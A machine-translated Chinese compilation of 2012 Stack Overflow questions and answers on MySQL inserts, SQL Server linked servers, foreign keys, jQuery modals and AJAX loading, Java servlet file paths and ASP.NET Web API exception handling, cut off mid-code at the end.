在下面的示例中，我们有一个公式，`x_next`它等于`x+1`when `location`is `False`and `x >= 12`，等于`x-1`when `location`is `True`and `x <= 0`，并且等于`x`else 。

```
x_next == If(And(Not(location), x >= 12),
             x+1,
             If(And(location, x <= 0), x-1, x)) 
```

# java - 如何从 Java 源代码中删除不必要的空格？

> ID：11866074
> 
> 赞同：0
> 
> 时间：2012-08-08T13:54:42.890
> 
> 标签：java, obfuscation

我见过 jquery.min.js 和一些 CSS 文件，其中删除了所有不必要的空格。是否有可用于混淆 Java 源代码的工具？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:03:55.720

> 是的，我想要不可读

您不需要提供原始源代码，您可以将其编译为字节码，因为它可以在任何 Java 平台上运行。

已编译代码的字节码已经很难阅读，但可以反编译。您可以使用字节码混淆器使反编译变得困难。

有几个（商业和免费）

[https://www.google.co.uk/search?q=java+obfuscator](https://www.google.co.uk/search?q=java+obfuscator)

这会以 JVM 可以读取但不容易像原始 Java 那样读取或生成可编译代码的方式更改字节。例如将字段名称转换为数字等。

顺便说一句：你总是可以对代码进行逆向工程，但你可以让它更难做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:19:26.633

这是使您的 java 代码不可读的最佳方法：不要发布您的 java 代码。

如果您必须发布您的 java 代码，请不要混淆它。

混淆您的 Java 代码的充分理由完全为零。

# mysql - MySQL Insert 需要指定所有字段？

> ID：11866077
> 
> 赞同：0
> 
> 时间：2012-08-08T13:55:01.923
> 
> 标签：mysql

当我执行一个指定表中某些但不是所有字段的 pdo 时，它会在一个服务器上正常插入，但无法在另一台服务器上插入。

例如，在问题服务器上......

使用具有三个字段的表`id`, `time`, 和`intervention`...

如果我运行此语句，它会按预期插入。

```
$query = "INSERT INTO data_agreements (`id`, `time`, `intervention`) VALUES (?, ?, ?)";
$q = $pdo->prepare($query);
$q->execute(array("x", "y", "z")); 
```

但是，如果我运行以下语句，则无法插入。

```
$query = "INSERT INTO data_agreements (`id`, `time`) VALUES (?, ?)";
$q = $pdo->prepare($query);
$q->execute(array("x", "y")); 
```

问题服务器是一个带有 MySql 5、PHP 5.2.6 的 IIS。在具有 MySql 5、PHP 5.2.6 的不同服务器 Apache 上，两个语句都按预期插入。所以我想知道是否需要在问题服务器上设置一些 MySQL 安装/设置，以告诉它接受仅指定表中字段子集的语句。?

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:25:24.917

您的 SQL 语句在语法上没有任何问题。MySQL 服务器中没有特定的“设置”来控制这种行为，但是有一些设置可以影响特定的 INSERT 语句是否成功，例如，允许无效日期的设置（即不存在的日期）例如 6 月 31 日），以及允许存储零日期（'0000-00-00'）的设置。（此行为已在不同版本中发生变化，其中“旧”（例如 V3.23）默认值是允许无效日期，而“较新”（例如 v5.1）默认值是不允许无效日期。）

如果为绑定参数提供的值是有效的，那么对您观察到的行为最可能的解释是存在（或将）违反的 CONSTRAINT。

这可能是主键约束、唯一键约束、外键约束、NOT NULL 约束，甚至可能是引发异常的触发器。

例如，列干预可能被定义为 NOT NULL 并且没有指定默认值。

MySQL 错误信息可能对调试有用。

另一种可能性是该语句实际上是成功的，但是是在随后被回滚而不是提交的事务的上下文中执行的。）

您的问题中没有足够的信息可以说明。

我建议您比较两个数据库上的表定义。最简单的方法（对我来说）是`SHOW CREATE TABLE intervention`从每个数据库的语句中获取输出，并寻找差异。也有可能其中一个数据库有一个 BEFORE INSERT FOR EACH ROW 触发器，而另一个数据库中缺少该触发器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:01:22.373

```
INSERT INTO data_agreements 
  (id, time) 
VALUES 
  (?, ?) ; 
```

**如果**其他字段（`intervention`在这种情况下）已使用`DEFAULT`属性或`AUTO_INCREMENT`创建表时定义，则运行良好。如果没有，您必须显式地为`INSERT`语句提供一个值。

检查`SHOW CREATE TABLE data_agreements`2 个安装中的表是如何定义的。

表的`TIMESTAMP`列具有不明显的功能。其中只有一个可以有一个`DEFAULT CURRENT_TIMESTAMP`属性（如果你没有说明，只有表中的第一个获得这个默认值）。

如果您定义了一个包含多个时间戳列的表，然后删除了第一个，则可能会导致您遇到的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:38:57.037

我敢打赌列`intervention` *不允许* `null`值。

尝试改变表格，看看它是否有效：

```
ALTER table data_agreements Modify intervention varchar(50) null DEFAULT ''; 
```

并尝试再次执行查询。我认为这`intervention`是字符串，但当然，您可以修改它以满足您的需要。

谢谢。

# sql-server - 在 SQL Server 中更改链接服务器的属性

> ID：11866079
> 
> 赞同：21
> 
> 时间：2012-08-08T13:55:13.823
> 
> 标签：sql-server, sql-server-2008, tsql

有什么方法可以更改现有链接服务器的属性（产品名称、数据源、提供程序字符串等）？当我进入属性屏幕时，所有选项都是灰色的。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2016-10-27T16:03:39.597

这是命令。

```
EXEC master.dbo.sp_serveroption @server=N'<SERVERNAME>', @optname=N'name', @optvalue=N'<NEWNAME>' 
```

将“SERVERNAME”替换为链接服务器的当前名称。将“NEWNAME”替换为您要为链接服务器提供的新名称。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2014-08-12T08:55:11.533

在 SQL Server management Studio 中，在链接服务器上单击鼠标右键，选择“将链接服务器编写为”，然后选择“DROP and CREATE to”，然后选择“New Query Editor Window”。您现在可以调整要在脚本中调整的任何设置，然后运行它。现有的链接服务器将被删除并创建一个新的。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2014-07-28T22:36:44.057

您唯一的选择是使用[sp_setnetname](http://msdn.microsoft.com/en-us/library/ms190318.aspx)。您可以使用它来更改链接服务器（目标）的 data_source，例如：

```
DECLARE @name sysname = 'SRVRNAME', @datasource sysname = 'srvr.name.com';
EXECUTE sp_setnetname @server = @name, @netname = @datasource; 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-02-08T14:25:53.500

我能够使用带有@optname=N'name' 的sp_serveroption 更改链接服务器的名称。此选项似乎不在 sp_serveroption 的 BOL 文档中。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-08T14:15:40.930

我最终创建了一个新的链接服务器并删除了旧的。不幸的是，无法编辑现有实例

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-06-18T17:59:23.840

各种响应的合并，以及阅读文档 - 这仅记录用于 SQL 链接服务器，而不是备用数据源：

```
select server_id, name, data_source from sys.servers where product = 'SQL Server'

DECLARE @oldName nvarchar(30) = 'oldSERVER', --must match current entry under sys.servers.name
@name sysname = 'newServer', 
@datasource sysname = 'newServer.DNSDomainName.com' -- can be a windows FDQN that is not SQL valid if needed for RPC cross domain resolution

/* Comment out this marker to perform update
EXEC master.dbo.sp_serveroption @server=@oldName, @optname=N'name', @optvalue=@name
EXECUTE sp_setnetname @server = @name, @netname = @datasource;

select server_id, name, data_source from sys.servers where product = 'SQL Server'
--*/ 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-08T20:38:11.143

查看[sp_serveroption](http://msdn.microsoft.com/en-us/library/ms178532.aspx)。无论如何，这就是 GUI 最终的方式。如果最终不允许更改您尝试更改的内容，您应该从此存储过程中获得有意义的错误消息。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-09-13T11:03:52.260

我的经验（我使用 SQL Server 2016 链接到 SQL Server 2012 实例，我想重命名链接服务器并更改它的目标）是我需要结合 Xipooo 和 Jordan Parker 的答案。

sp_serveroption 重命名了链接服务器，sp_setnetname 更改了链接服务器的目标。

* * *

## 回答 #9

> 赞同：-3
> 
> 时间：2014-01-24T06:35:52.547

转到启动管理工具并打开数据源（odbc）然后单击系统 dsn，在这里您将找到链接服务器的 dsn 名称。从这里您可以编辑链接服务器的属性。您还可以测试连接。

~ Kishore SG

# sql-server - 如何找到所有具有引用特定 table.column 的外键并具有这些外键值的表？

> ID：11866081
> 
> 赞同：25
> 
> 时间：2012-08-08T13:55:17.673
> 
> 标签：sql-server, sql-server-2008

我有一个表，其主键在其他几个表中作为外键引用。例如：

```
CREATE TABLE `X` (
  `X_id` int NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY  (`X_id`)
)
CREATE TABLE `Y` (
  `Y_id` int(11) NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `X_id` int DEFAULT NULL,
  PRIMARY KEY  (`Y_id`),
  CONSTRAINT `Y_X` FOREIGN KEY (`X_id`) REFERENCES `X` (`X_id`)
)
CREATE TABLE `Z` (
  `Z_id` int(11) NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `X_id` int DEFAULT NULL,
  PRIMARY KEY  (`Z_id`),
  CONSTRAINT `Z_X` FOREIGN KEY (`X_id`) REFERENCES `X` (`X_id`)
) 
```

现在，我不知道数据库中有多少表包含 X 的外键，例如表 Y 和 Z。是否有一个 SQL 查询可以用来返回： 1\. 具有外键的表的列表X AND 2\. 哪些表实际上在外键中有值？

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-08-08T14:00:26.413

试试这个查询：

您必须使用**sysreferences**和**sysobjects** 表来获取信息

下面的查询给出了所有外键以及数据库中列名的父表

```
select cast(f.name as varchar(255)) as foreign_key_name
, cast(c.name as varchar(255)) as foreign_table
, cast(fc.name as varchar(255)) as foreign_column
, cast(p.name as varchar(255)) as parent_table
, cast(rc.name as varchar(255)) as parent_column
from  sysobjects f
inner join sysobjects c on f.parent_obj = c.id
inner join sysreferences r on f.id = r.constid
inner join sysobjects p on r.rkeyid = p.id
inner join syscolumns rc on r.rkeyid = rc.id and r.rkey1 = rc.colid
inner join syscolumns fc on r.fkeyid = fc.id and r.fkey1 = fc.colid
where f.type = 'F' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-19T09:53:12.343

如果您只关心表名，则可以使用以下查询：

```
select * from  REFERENTIAL_CONSTRAINTS where CONSTRAINT_SCHEMA='schema_name' and REFERENCED_TABLE_NAME='table_name' order by TABLE_NAME 
```

否则您可以从上述查询中获取表名，然后使用以下查询获取该特定表的外键元数据：

```
SELECT * FROM `information_schema`.`KEY_COLUMN_USAGE` WHERE  CONSTRAINT_SCHEMA='schema_name' and `TABLE_NAME` = 'table_name'; 
```

# ajax - Jquery Modal 使用 AJAX 自动关闭

> ID：11866084
> 
> 赞同：1
> 
> 时间：2012-08-08T13:55:25.400
> 
> 标签：ajax, jquery

我有一个带有两个按钮的表单（用 HTML 和 PHP 制作）。其中一个按钮只是保存表单（插入或更新），另一个按钮执行相同操作并发送电子邮件。

我有 jquery 模式，以便在每次按下按钮之一时确认提交操作。按下按钮后，会出现另一个模式，仅用于确认进程已终止且没有任何错误。

我的问题是，当我按下“保存”按钮（不发送电子邮件的那个）时，它会出现，然后在 1 秒后消失。它应该只在我按下按钮关闭时关闭。另一个按钮工作正常。

这是我正在使用的代码：

```
 $.modal({
            content: $('#' + modalErrorId),
            title: 'Informa\u00E7\u00E3o',
            maxWidth: 500,
            buttons: modalButtons,
            zIndex: 500,
        }); 
```

除此之外：

```
$.ajax( {
   type: "POST",
   url: form.attr('action'),
   data: form.serialize(),
   success: function( response ) {
   openModal('modalSuccessMessage');
   }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:45:44.537

好的，试试

```
$.ajax( {
   type: "POST",
   url: form.attr('action'),
   data: form.serialize(),
   success: function( response ) {
   openModal('modalSuccessMessage');
   }
});    
return false; 
```

或者

```
e.preventDefault();
$.ajax( {
   type: "POST",
   url: form.attr('action'),
   data: form.serialize(),
   success: function( response ) {
   openModal('modalSuccessMessage');
   }
}); 
```

你可能有这样的代码，

```
$('#buttonid').on('click', function(e){
    // ajax call
}); 
```

或者

```
$('#formid').on('submit', function(e){
    // ajax call
}); 
```

如果我猜对了，原因是

模态出现后，表单以常规方式提交，导致页面刷新，因此正在刷新 DOM，因此模态消失。`return false`或`e.preventDefault()`阻止以常规方式提交表单。

# asp.net-mvc - ASP .NET MVC、Windows Azure 和 SQL 地理

> ID：11866090
> 
> 赞同：0
> 
> 时间：2012-08-08T13:55:39.157
> 
> 标签：asp.net-mvc, entity-framework-4, sqlgeography

我使用[本](https://www.windowsazure.com/en-us/develop/net/tutorials/web-site-with-sql-database/)教程创建了管理人员表的 ASP .NET MVC 站点。现在，我想添加另一个表（带有控制器）来管理一个 SQLGeography 类型的表。EF 4.3 不支持 SQLGeography，所以如果我在模型中使用它不能生成所有的添加、更新、删除表单和方法。在我看来，我有两种选择：

1.  创建临时表，VS知道如何生成（经度和纬度为两个双精度）。然后，在发生添加/更新时将触发器添加到数据库以在主表中更新它。（我使用 SQLGeography 作为 WebAPI，因此我不在乎它会显示为两个双打）。
2.  不要使用EF。如果这是正确的方法，我该怎么做？我创建空控制器，然后使用 ADO .NET 添加/更新/删除？

我希望我的问题能被理解，我很难使用 SQLGeography。

谢谢！

# mysql - mysql 根据另一个表的计数选择行

> ID：11866095
> 
> 赞同：3
> 
> 时间：2012-08-08T13:56:14.453
> 
> 标签：mysql, sql, count

我在一个表中有一张博客文章表。在一个单独的表中，我有存储在与特定博客文章相关的目录中的图像记录。

如何编写仅选择至少有 5 张照片的博客文章的查询？

BlogPosts 表有一个“ID”列。Photos 表有一个 'PostID' 列，对应于 BlogPosts 的 'ID' 列。

```
$query = "SELECT * FROM BlogPosts WHERE ?" 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-08T14:02:30.583

```
SELECT * 
FROM BlogPosts 
WHERE ID IN 
    (SELECT PostID FROM photos GROUP BY PostID HAVING count(*) >= 5) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:09:11.057

下面是一个应该返回指定结果集的语句示例。

```
SELECT b.*
  FROM BlogPosts b
  JOIN (SELECT p.PostID
          FROM photos p
         GROUP BY p.PostID
        HAVING COUNT(1) >= 5
       ) c
    ON c.PostID = b.ID 
```

这个查询使用了一个内联视图，别名为`c`. 内联视图从照片表中返回一个不同的 PostID 值列表，照片表中至少有五行。然后它将该结果集“连接”到 BlogPosts 表，因此它只返回 ID 与子查询中的 PostID 匹配的行。

**注意：**在 MySQL 上，这种使用内联视图的表单（通常）会比使用`IN (subquery)`谓词执行得更好。

**注意：**请平息任何你必须在视图中“隐藏”它的冲动，只是为了以后需要阅读这段代码的其他人，并弄清楚查询在做什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:05:34.443

要获取照片中每个 PostID 至少有五个的行...

按 PostID 从照片组中选择 PostID、count(PostID) 作为出现次数

只得到至少有五个的那些......

select PostID from (select PostID, count(PostID) as occurances from Photos group by PostID) p where occurances >= 5

要获取对应的博客文章...

select * from BlogPosts where ID in (select PostID from (select PostID, count(PostID) as occurances from Photos group by PostID) p where occurances >= 5);

或者，真的 - 您应该首先创建一个视图，该视图仅返回出现次数超过五次的照片中的 PostID：

创建视图 atLeastFive 作为 select PostID from (select PostID, count(PostID) asoccurances from Photos group by PostID) p whereoccurrances >= 5

然后你的查询看起来更漂亮一点：

从 ID 所在的 BlogPosts 中选择 *（从 atLeastFive 中选择 PostID）

确保您的 Photos 表在 PostID 上有一个索引，否则性能最终会受到影响。

# java - 运行在 java servlet 中读写外部文本文件的应用程序

> ID：11866105
> 
> 赞同：0
> 
> 时间：2012-08-08T13:56:41.313
> 
> 标签：java, servlets, io

我是 java servlet 的新手。我正在编写一个读取和写入文本文件的应用程序。但是，我在使用 JSP 的 java servlet 上运行此应用程序。当我在 Eclipse 中运行 servlet 时，它一直报告找不到文件错误。我真的不知道如何更正文件路径，以便 servlet 不会抱怨它。

基本上，应用程序和 servlet 代码在同一个 src 文件夹中，但不同的包。你能告诉我我应该把这些文本文件放在哪里以及我应该如何读写它们吗？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:29:25.647

***一些信息***

*   客户端可以浏览 Web 应用程序上下文根中的文件。我怀疑这不是一个理想的功能。
*   Web 应用程序中 WEB-INF 文件夹下的文件可供 Web 应用程序访问，但客户端无法浏览。

***建议的解决方案 1***

*   计划将文件放在WEB-INF文件夹下的一个文件夹中；也许命名为“文件”（*即*“WEB-INF/文件”）。
*   使用[ServletContext.getRealPath()](http://docs.oracle.com/javaee/5/api/javax/servlet/ServletContext.html)获取真实的文件路径。
*   使用 java IO（BufferedReader、Scanner、其他东西 - 您选择）读取和写入文件。

***建议的解决方案 2***

基于以下评论。servlet 将是安装在已知主机上的 servlet 容器（可能是 Tomcat）中的 Web 应用程序的一部分。在主机上创建一个目录。将此目录作为参数添加到 servlet（可能是 servlet 配置、可能是属性文件、可能是硬编码字符串或任何其他解决方案）。完成此操作后，servlet 将知道在哪里读取和写入文件。此时，任何应用程序都可以读取和写入相关文件。

此解决方案无需使用 getRealPath()，真实路径是 servlet 的参数。

***推荐阅读清单***

有关介绍（可能过时，但仍然很好），请阅读[Core Servlets](http://courses.coreservlets.com/Course-Materials/csajsp2.html)网站上的“中级 Servlets 和 JSP”和“高级 Servlets 和 JSP”教程。

另一个介绍来源是[Java EE 5 教程](http://docs.oracle.com/javaee/5/tutorial/doc/)。整个教程都很好，但请关注第 II 部分的第 3 章和第 4 章来获取 servlet 信息。我更喜欢本教程而不是[Java EE 6 教程](http://docs.oracle.com/javaee/6/tutorial/doc/)，但这可能只是个人喜好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:01:34.410

默认目录是您的项目的目录。将您的文件放在项目目录中，对我来说它是“C:\Documents and Settings\myusername\workspace\projectname”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:29:02.033

你可以把文件放在你想要的任何地方，但我建议你把它放在 WEB-INF 下，这样就不能直接访问它。

您可以使用以下方式访问它：

getServletContext().getRealPath("/WEB-INF/文件名");

# php - jQuery - 如何在另一个页面中填充 div

> ID：11866106
> 
> 赞同：4
> 
> 时间：2012-08-08T13:56:41.393
> 
> 标签：php, jquery, jquery-selectors

我一直在摸索一段时间，所以我会尽可能简单：在页面 A 上的表单提交中，我想将页面 B 的内容加载到页面 C 上的 div 中。示例：

登录.html

```
<form id="test" action="#" method="post">
  <input type="text" name="user"/>
  <input type="submit" name="login" value="login"/>
</form> 
```

用户.php

```
<?php
  echo "Hello, ".$_POST['user'];
?> 
```

索引.html

```
<body>
 <div id="target"></div>
</body> 
```

最终结果（index.html）

“你好，约翰多”

我应该使用带有 URL 的 load() 方法作为第一个选择器吗？

```
$('#test').submit(function() {
 $('index.html#target').load('user.php');
}); 
```

PS：所有页面都在同一个域上。

PPS：我说的是在不同的页面内，而不是从不同的页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:13:05.170

更改`$('index.html#target').load('user.php')`为`$('#target').load('user.php');`

如果您想使用以下代码获取带有 id`target`的div：`user.php`

```
$('#target').load('user.php #targer'); 
```

但是您可能想发送发布请求？

```
$.post('user.php', $('form').serialize(), function(data){
    $("#target").html(data)
});​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

需要学习的东西：

*   [http://api.jquery.com/serialize/](http://api.jquery.com/serialize/)
*   [http://api.jquery.com/jQuery.post/](http://api.jquery.com/jQuery.post/)
*   [http://docs.jquery.com/How_jQuery_Works](http://docs.jquery.com/How_jQuery_Works)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:10:33.097

这似乎需要改变

```
$('index.html#target').load('user.php'); 
```

至

```
$('#target').load('user.php'); 
```

编辑：好的，我将添加一些希望有用的代码，并带有一些非常基本的标记。这不是特定于您的代码的，但这个概念应该很有用，并且只用几个 html 页面就可以测试，没什么特别的。

我将说明的是如何从一个页面、另一个页面调用脚本。我将拥有一个称为主页面的页面/窗口，以及另一个称为子页面的页面/窗口。这些都不是非常花哨的标记。

他们将使用一些非常基本的脚本调用进行交互，甚至将信息来回传递给彼此。我将首先介绍每个的标记，然后是每个中的脚本。每个页面的标题中都有 jQuery 链接。

我的主要观点是，只要您获得对每个页面的引用，您就可以使用它的修改版本来告诉一个页面使用从另一个页面实例化的脚本/动作来做某事。在我的示例中，我使用 window open 和 window.opener 作为此参考。

主页标记：页面是“TestCallbackmain.html”

```
<body>
    <div class='pagetop'>
        Test Callback Main
    </div>
    <div class='pageDetailContainer'>
        <div class='pageDetail'>
            Move on folks, nothing to see here
            <div id='detailContent'>
            </div>
            <button id='closeChildy'>
                Close Childy Window</button>
            <button id='openChildy'>
                Open Childy Window</button>
            <div id='childSees'>
                me empty</div>
        </div>
    </div>
</body> 
```

子页面标记：这称为“TestCallBack.html”

```
<body>
    <div class='pagetop'>
        Test Callback Child
    </div>
    <div class='pageDetailContainer'>
        <div class='pageDetail'>
            <div id="achildy">
                HereIBe
                <div id="inchildy">
                    I am childy text
                </div>
            </div>
            <button id='pleaseKillMe'>
                Have Parent Close Me</button>
            <div id='textHolder'>
            </div>
            <div id='callbackTextHold'>
            </div>
        </div>
    </div>
    Howdy
</body> 
```

主页面脚本：

```
function logNewWindow(newWindow, JQnewWindowDoc) {
    var mychildText = JQnewWindowDoc.text(); //all the child doc text
    var innerChildText = $("#inchildy", JQnewWindowDoc).text(); // one element text
    var gotback = newWindow.childCallBack("CHILD TEXT:" + mychildText + " INNER:" + innerChildText);
    $('#callbackTextHold').text("GOT:" + gotback); //child sent me this text from childCallBack
};

var AWindow;
function openChild() {
    AWindow = window.open("TestCallBack.html");
};
$(document).ready(function() {
    $('#detailContent').text('Loaded JQ');
    $('#closeChildy').click(function() {
        AWindow.close();
    });
    $('#openChildy').click(function(e) {
        openChild();
        e.stopImmediatePropagation();
    });
}); 
```

子页面脚本：

```
var ct;
function childCallBack(passstuff) {
    $('#textHolder').html('ct:"' + ct + '"<br /> CHILD GOT:(' + passstuff + ")");
    return ct;
};

$(document).ready(function() {
    ct = $("#achildy").text();
    window.opener.logNewWindow(window, $(document));

    $('#childSees', window.opener.document).text('You been Had by child');

    $('#pleaseKillMe').click(function() {
        $('#closeChildy', window.opener.document).click();
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:04:40.100

最好的可能是在服务器端进行。

在 index.html（应该是 index.php）中，您执行以下操作：

```
<body>
    <div id="target">
         <?php include 'user.php';
    ?></div>
</body> 
```

在 login.html 中，表单应该这样设置：

```
<form id="test" action="index.php" method="post"> 
```

请注意，不需要 js 或 jQuery。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:05:44.580

用户.php

```
<?php 
    session_start();
    if($_POST && $_POST['user']):
      if(!isset($_SESSION['user'])):
        $_SESSION['user'] = $_POST['user'];
        echo $_SESSION['user'];
      endif;
    elseif(isset($_SESSION['user'])):
      echo $_SESSION['user'];
    else:
      echo 'How did you get to this page?';
    endif;
?> 
```

按预期加载文件。如果有表单数据发布到文件，您将返回它。如果没有表单数据，但表单之前已提交，会话将捕获该数据并输出用户名。如果他们从不提交表单，但还是请求了该页面，他们会得到“您是如何到达此页面的”？

# c# - 如何从 WebApi 消息处理程序优雅地返回异常

> ID：11866114
> 
> 赞同：13
> 
> 时间：2012-08-08T13:57:09.830
> 
> 标签：c#, asp.net-web-api

我的 Mvc\WebApi 应用程序中有一个全局 ExceptionFilter 注册为：

```
public virtual void RegisterHttpFilters(HttpConfiguration config)
{
    config.Filters.Add(new MyExceptionFilter(_exceptionHandler));
} 
```

其中 MyExceptionFilter 是：

```
public class MyExceptionFilter : ExceptionFilterAttribute
{
    private readonly IMyExceptionHandler m_exceptionHandler;

    public MyExceptionFilter(IMyExceptionHandler exceptionHandler)
    {
        m_exceptionHandler = exceptionHandler;
    }

    public override void OnException(HttpActionExecutedContext context)
    {
        Exception ex = context.Exception;
        if (ex != null)
        {
            object response = null;
            HttpStatusCode statusCode = m_exceptionHandler != null
                ? m_exceptionHandler.HandleException(ex, out response)
                : HttpStatusCode.InternalServerError;
            context.Response = context.Request.CreateResponse(statusCode, response ?? ex);
        }

        base.OnException(context);
    }
} 
```

此过滤器将所有异常作为 json 对象返回，并允许一些 IMyExceptionHandler 实现自定义返回的对象。

这一切运作良好。直到我的一些消息处理程序出现异常：

```
public class FooMessageHandler : DelegatingHandler
{
    private readonly Func<IBar> _barFactory;
    public FooMessageHandler(Func<IBar> barFactory)
    {
        _barFactory = varFactory;
    }

    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
    {
        request.Properties["MY_BAR"] = _barFactory();
        return base.SendAsync(request, cancellationToken);
    }
} 
```

如您所见，此处理程序创建了一些组件并将其放入当前的 http 请求消息中。当 FuncOfIBar 中发生异常时，我会得到黄屏死机。我的 ExceptionFilter 没有被调用。

我试图在消息处理程序中专门捕获异常并返回 HttpResponseException 但它没有改变任何东西 - 仍然得到 YSOD：

```
public class XApplicationInitializerMessageHandler : DelegatingHandler
{
    private readonly Func<IXCoreApplication> _appFactory;
    private readonly IXExceptionHandler m_exceptionHandler;

    public XApplicationInitializerMessageHandler(Func<IXCoreApplication> appFactory, IXExceptionHandler exceptionHandler)
    {
        ArgumentValidator.EnsureArgumentNotNull(appFactory, "appFactory");
        _appFactory = appFactory;
        m_exceptionHandler = exceptionHandler;
    }

    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
    {
        try
        {
            request.SetApplication(_appFactory());
        }
        catch (Exception ex)
        {
            object resultObject = null;
            HttpStatusCode statusCode = m_exceptionHandler != null
                ? m_exceptionHandler.HandleException(ex, out resultObject)
                : HttpStatusCode.InternalServerError;
            HttpResponseMessage responseMessage = request.CreateResponse(statusCode, resultObject ?? ex);

            throw new HttpResponseException(responseMessage);
        }
        return base.SendAsync(request, cancellationToken);
    }
} 
```

}

无论在哪里发生异常，我都希望我的应用程序的行为相同：在 ApiController 或消息处理程序中。

**这个怎么做？**

我知道 Application_Error 但我想保持 HttpApplication 自定义不可触及。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-08T14:09:19.997

而不是扔`HttpResponseException`我应该只返回一个`HttpResponseMessage`：

```
protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
{
    try
    {
        request.SetApplication(_appFactory());
    }
    catch (Exception ex)
    {
        object resultObject = null;
        HttpStatusCode statusCode = m_exceptionHandler != null
            ? m_exceptionHandler.HandleException(ex, out resultObject)
            : HttpStatusCode.InternalServerError;
        HttpResponseMessage responseMessage = request.CreateResponse(statusCode, resultObject ?? ex);

        return Task<HttpResponseMessage>.Factory.StartNew(() => responseMessage);
    }
    return base.SendAsync(request, cancellationToken);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-10T11:39:02.780

我对 succes 所做的是使用基于属性的方法。您在应该使用异常处理的每个操作上放置一个自定义属性：

```
[ExceptionHandling] 
public IEnumerable<string> Get() 
```

您的自定义异常处理属性是这样实现的：

```
public class ExceptionHandlingAttribute : ExceptionFilterAttribute
{
    public override void OnException(HttpActionExecutedContext context)
    {} 
```

如您所见，自定义属性继承自 ExceptionFilterAttribute。然后，您只需覆盖 OnException 方法。然后您可以做的是查看异常的类型并根据业务规则或任何适合您的需求来处理它。在某些情况下，您可能只是吞下服务器上的异常。如果要通知客户端，可以抛出一个 HttpResponseException，它可以保存所有相关信息，例如消息、调用堆栈、内部异常等。

如需更多灵感，请查看这篇精彩的博客文章：[ASP.NET Web API 异常处理](http://weblogs.asp.net/fredriknormen/archive/2012/06/11/asp-net-web-api-exception-handling.aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-03-04T18:18:20.410

我有同样的问题，全局异常过滤器没有运行。解决方案是 Web API 异常过滤器必须配置在与 ASP.NET MVC 异常过滤器不同的全局集合中。

因此，要配置 ASP.NET MVC 错误处理，您将运行：

```
System.Web.Mvc.GlobalFilters.Filters.Add(new MyMvcExceptionFilter()); 
```

但是对于 Web API 错误处理，您必须运行：

```
System.Web.Http.GlobalConfiguration.Configuration.Filters.Add(new MyWebApiExceptionFilter()); 
```

根据我对 Web API 的有限经验，这种情况很典型：从表面上看，所使用的模式与 ASP.NET MVC 非常相似，因此很熟悉。这给人一种错觉，即编写一段代码将对两个框架都有影响，但实际上它们下面的实现在很大程度上或完全独立，您需要编写两个非常相似的代码版本才能全部完成工作。

Web API 异常处理的优秀参考：[http ://www.asp.net/web-api/overview/web-api-routing-and-actions/exception-handling](http://www.asp.net/web-api/overview/web-api-routing-and-actions/exception-handling)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-11-02T01:25:54.503

在startup.cs中：

```
config.Services.Replace(typeof(IExceptionHandler), new GlobalExceptionHandler()); 
```

我发现使用 GlobalExceptionHandler 可以在委托处理程序中捕获异常并返回自定义 JSON 对象。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-30T13:45:35.900

我发现这个博客有很好的例子： http: [//nodogmablog.bryanhogan.net/2016/07/getting-web-api-exception-details-from-a-httpresponsemessage/](http://nodogmablog.bryanhogan.net/2016/07/getting-web-api-exception-details-from-a-httpresponsemessage/)

我采用了一些更新的代码：

```
if ((int)response.StatusCode >= 400)
 {
      exceptionResponse = JsonConvert.DeserializeObject<ExceptionResponse>(LogRequisicao.CorpoResposta);
      LogRequisicao.CorpoResposta = exceptionResponse.ToString() ;
      if (exceptionResponse.InnerException != null)
             LogRequisicao.CorpoResposta += "\r\n InnerException: " + exceptionResponse.ToString();
 } 
```

使用对象：

```
public class ExceptionResponse
    {
        public string Message { get; set; }
        public string ExceptionMessage { get; set; }
        public string ExceptionType { get; set; }
        public string StackTrace { get; set; }
        public ExceptionResponse InnerException { get; set; }

        public override String ToString()
        {
            return "Message: " + Message + "\r\n "
                + "ExceptionMessage: " + ExceptionMessage + "\r\n "
